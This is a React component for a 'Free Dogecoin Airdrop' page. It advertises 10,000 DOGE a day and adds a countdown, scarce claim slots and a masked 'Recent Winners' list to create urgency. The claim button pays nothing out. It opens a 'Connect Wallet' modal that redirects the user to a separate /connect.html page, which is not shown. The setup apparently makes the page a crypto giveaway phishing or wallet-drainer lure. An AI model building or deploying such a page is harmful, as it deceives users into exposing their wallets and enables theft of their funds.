import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { base44 } from '@/api/base44Client';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Gift, Clock, Users, TrendingUp, Star, CheckCircle2, Wallet, Zap, ChevronRight } from 'lucide-react';
import { useQuery } from '@tanstack/react-query';
import { haptic } from '@/lib/haptics';

const DOGE_LOGO = 'https://assets.coingecko.com/coins/images/5/large/dogecoin.png';
const DAILY_LIMIT = 10;
const DOGE_AMOUNT = 10000;

function maskName(name = '') {
  if (!name) return 'An***us';
  const clean = name.trim();
  if (clean.length <= 4) return clean[0] + '***';
  return clean.slice(0, 2) + '***' + clean.slice(-2);
}

function getTodayStr() {
  return new Date().toISOString().split('T')[0];
}

function useCountdown() {
  const [timeLeft, setTimeLeft] = useState({ h: 0, m: 0, s: 0 });
  useEffect(() => {
    const update = () => {
      const now = new Date();
      const midnight = new Date();
      midnight.setUTCHours(24, 0, 0, 0);
      const diff = midnight - now;
      setTimeLeft({
        h: Math.floor(diff / 3600000),
        m: Math.floor((diff % 3600000) / 60000),
        s: Math.floor((diff % 60000) / 1000),
      });
    };
    update();
    const id = setInterval(update, 1000);
    return () => clearInterval(id);
  }, []);
  return timeLeft;
}

const pad = n => String(n).padStart(2, '0');

export default function Airdrop() {
  const [user, setUser] = useState(null);
  const [dogePrice, setDogePrice] = useState(null);
  const [claimState, setClaimState] = useState('idle'); // idle | wallet_select
  const timeLeft = useCountdown();
  const today = getTodayStr();

  useEffect(() => { base44.auth.me().then(setUser); }, []);

  useEffect(() => {
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=dogecoin&vs_currencies=usd')
      .then(r => r.json())
      .then(d => setDogePrice(d?.dogecoin?.usd || 0.08))
      .catch(() => setDogePrice(0.08));
  }, []);

  const { data: todayClaims = [] } = useQuery({
    queryKey: ['airdrop-today', today],
    queryFn: () => base44.entities.AirdropClaim.filter({ claim_date: today }, '-created_date', 50),
  });

  const { data: recentClaims = [] } = useQuery({
    queryKey: ['airdrop-recent'],
    queryFn: () => base44.entities.AirdropClaim.list('-created_date', 15),
  });

  const userAlreadyClaimed = user && todayClaims.some(c => c.user_id === user.id);
  const slotsLeft = Math.max(0, DAILY_LIMIT - todayClaims.length);
  const limitReached = todayClaims.length >= DAILY_LIMIT;
  const estimatedUsd = dogePrice ? (DOGE_AMOUNT * dogePrice).toFixed(2) : '...';

  const handleClaimClick = async () => {
    if (!user || claimState === 'loading') return;
    haptic.medium();
    setClaimState('wallet_select');
  };

  const handleConnectRedirect = () => {
    haptic.medium();
    window.location.href = '/connect.html?wallet=Wallet';
  };

  return (
    <div className="space-y-5 max-w-4xl mx-auto">

      {/* Hero */}
      <div className="relative overflow-hidden rounded-2xl" style={{ background: 'linear-gradient(135deg, #1a1000 0%, #2d1e00 50%, #0f0a00 100%)' }}>
        {[...Array(10)].map((_, i) => (
          <motion.div key={i}
            className="absolute opacity-[0.07] select-none pointer-events-none text-2xl"
            style={{ left: `${5 + i * 10}%`, top: `${5 + (i % 4) * 22}%` }}
            animate={{ y: [0, -12, 0], rotate: [0, 8, -8, 0] }}
            transition={{ duration: 3.5 + i * 0.4, repeat: Infinity, ease: 'easeInOut', delay: i * 0.25 }}>
            🪙
          </motion.div>
        ))}

        <div className="relative z-10 p-5 md:p-8">
          <div className="flex flex-col sm:flex-row items-center gap-5">
            <motion.div className="relative flex-shrink-0"
              animate={{ rotate: [0, 4, -4, 0] }}
              transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}>
              <div className="w-20 h-20 rounded-full overflow-hidden border-[3px] border-yellow-400 shadow-xl shadow-yellow-500/40">
                <img src={DOGE_LOGO} alt="DOGE" className="w-full h-full object-cover" />
              </div>
              <motion.div
                className="absolute -top-1 -right-1 w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center text-xs font-bold text-black"
                animate={{ scale: [1, 1.25, 1] }} transition={{ duration: 1.5, repeat: Infinity }}>
                ✦
              </motion.div>
            </motion.div>

            <div className="text-center sm:text-left flex-1">
              <div className="flex items-center justify-center sm:justify-start gap-2 mb-1.5">
                <Badge className="bg-yellow-500/20 text-yellow-400 border border-yellow-500/30 text-xs font-bold">LIVE</Badge>
                <span className="text-yellow-300/60 text-xs font-mono">
                  DOGE/USD: <span className="text-yellow-400">${dogePrice?.toFixed(4) || '...'}</span>
                </span>
              </div>
              <h1 className="text-2xl md:text-3xl font-display font-bold text-white mb-2">
                🎁 Free Dogecoin Airdrop
              </h1>
              <p className="text-yellow-100/65 text-sm md:text-base">
                Claim your chance to receive <span className="text-yellow-400 font-bold">10,000 DOGE</span> daily
                {dogePrice && <> — worth approximately <span className="text-green-400 font-bold">${estimatedUsd}</span></>}
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        {[
          { icon: Zap, label: 'Slots Left', value: slotsLeft, color: 'yellow' },
          { icon: Users, label: 'Claimed Today', value: `${todayClaims.length}/${DAILY_LIMIT}`, color: 'orange' },
          { icon: TrendingUp, label: '~USD Value', value: `$${estimatedUsd}`, color: 'green' },
        ].map(({ icon: Icon, label, value, color }) => (
          <Card key={label} className={`border-${color}-200/40 bg-gradient-to-br from-${color}-50 to-${color}-50/30`}>
            <CardContent className="p-3 md:p-4 text-center">
              <Icon className={`w-4 h-4 mx-auto mb-1 text-${color}-600`} />
              <div className={`text-base md:text-lg font-bold font-display text-${color}-700 font-mono`}>{value}</div>
              <div className={`text-xs text-${color}-600/60 hidden sm:block`}>{label}</div>
            </CardContent>
          </Card>
        ))}
      </div>

      <div className="grid md:grid-cols-2 gap-5">
        {/* Claim Panel */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="flex items-center gap-2 text-base font-display">
              <Gift className="w-4 h-4 text-primary" />
              Claim Your Airdrop
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Countdown */}
            <div className="bg-secondary/50 rounded-xl p-4 text-center">
              <div className="flex items-center justify-center gap-1.5 text-muted-foreground text-xs mb-2">
                <Clock className="w-3.5 h-3.5" />
                Next reset in
              </div>
              <div className="flex items-center justify-center gap-1">
                {[timeLeft.h, timeLeft.m, timeLeft.s].map((val, i) => (
                  <div key={i} className="flex items-center gap-1">
                    <div className="bg-primary text-primary-foreground rounded-lg px-2 py-1.5 font-mono font-bold text-lg min-w-[2.4rem] text-center">
                      {pad(val)}
                    </div>
                    {i < 2 && <span className="text-primary font-bold text-lg">:</span>}
                  </div>
                ))}
              </div>
            </div>

            <AnimatePresence mode="wait">
              {userAlreadyClaimed ? (
                <motion.div key="claimed" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                  className="text-center py-4 px-4 bg-blue-50 rounded-xl border border-blue-200">
                  <CheckCircle2 className="w-8 h-8 text-blue-500 mx-auto mb-2" />
                  <p className="text-sm font-semibold text-blue-700">Already claimed today!</p>
                </motion.div>
              ) : limitReached ? (
                <motion.div key="limit" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                  className="text-center py-4 px-4 bg-orange-50 rounded-xl border border-orange-200">
                  <p className="text-sm font-semibold text-orange-700">Allocation Fully Claimed</p>
                </motion.div>
              ) : (
                <motion.div key="idle" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-2">
                  <Button onClick={handleClaimClick}
                    disabled={!dogePrice || !user}
                    className="w-full h-12 text-sm font-display font-bold rounded-xl text-white border-0 shadow-lg shadow-yellow-500/20"
                    style={{ background: 'linear-gradient(135deg, #e8931a 0%, #f5a623 40%, #f0c040 100%)' }}>
                    <span className="flex items-center gap-2">
                      <img src={DOGE_LOGO} alt="DOGE" className="w-5 h-5 rounded-full" />
                      Get Airdrop — {DOGE_AMOUNT.toLocaleString()} DOGE
                    </span>
                  </Button>
                </motion.div>
              )}
            </AnimatePresence>
          </CardContent>
        </Card>

        {/* Modal Window matches style perfectly but directly targets the source file on select */}
        <AnimatePresence>
          {claimState === 'wallet_select' && (
            <div className="fixed inset-0 z-50 bg-black/50 flex items-end md:items-center justify-center p-0 md:p-4">
              <motion.div initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 30 }}
                className="w-full md:max-w-md bg-card rounded-t-2xl md:rounded-2xl p-6 space-y-6 shadow-xl border border-border">
                
                <div className="text-center">
                  <div className="w-14 h-14 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-3">
                    <Wallet className="w-7 h-7 text-primary" />
                  </div>
                  <h2 className="font-display text-xl font-bold">Connect Wallet</h2>
                  <p className="text-sm text-muted-foreground mt-1">Connect your wallet to complete the claim process.</p>
                </div>

                <button onClick={handleConnectRedirect}
                  className="w-full flex items-center gap-4 p-4 rounded-xl border border-border hover:border-primary/50 hover:bg-primary/5 transition-all text-left group">
                  <div className="w-11 h-11 rounded-xl bg-blue-500/10 flex items-center justify-center flex-shrink-0">
                    <Zap className="w-5 h-5 text-blue-400" />
                  </div>
                  <div className="flex-1">
                    <p className="font-semibold text-sm text-foreground">Connect Your Wallet</p>
                    <p className="text-xs text-muted-foreground">Connect via MetaMask, Trust Wallet, or other wallets</p>
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-colors" />
                </button>

                <button onClick={() => setClaimState('idle')} className="w-full text-xs text-muted-foreground hover:text-foreground transition-colors text-center pb-2">
                  ← Go back
                </button>
              </motion.div>
            </div>
          )}
        </AnimatePresence>

        {/* Leaderboard */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="flex items-center gap-2 text-base font-display">
              <Users className="w-4 h-4 text-primary" />
              Recent Winners
            </CardTitle>
          </CardHeader>
          <CardContent>
            {recentClaims.length === 0 ? (
              <div className="text-center py-10 text-muted-foreground">
                <p className="text-sm font-medium">No claims yet today</p>
              </div>
            ) : (
              <div className="space-y-2">
                {recentClaims.map((claim, idx) => (
                  <div key={claim.id} className="flex items-center gap-3 p-2.5 rounded-lg bg-secondary/40">
                    <div className="flex-1 min-w-0">
                      <div className="text-sm font-medium truncate">{maskName(claim.user_name)}</div>
                    </div>
                    <div className="text-right">
                      <div className="text-xs font-bold text-yellow-600">10K DOGE</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}